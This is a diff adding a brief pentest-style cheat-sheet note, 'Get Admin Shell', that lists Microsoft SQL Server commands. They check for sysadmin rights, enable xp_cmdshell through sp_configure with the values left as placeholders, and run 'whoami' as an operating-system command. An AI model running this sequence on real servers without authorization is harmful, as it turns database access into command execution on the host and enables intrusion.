@@ -1,0 +1,11 @@
+
+## Get Admin Shell
+SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
+----------> REspond with som number
+EXEC sp_configure 'Show Advanced Options', [someNumber];
+reconfigure;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', [someNumber];
+reconfigure;
+xp_cmdshell "whoami";
+
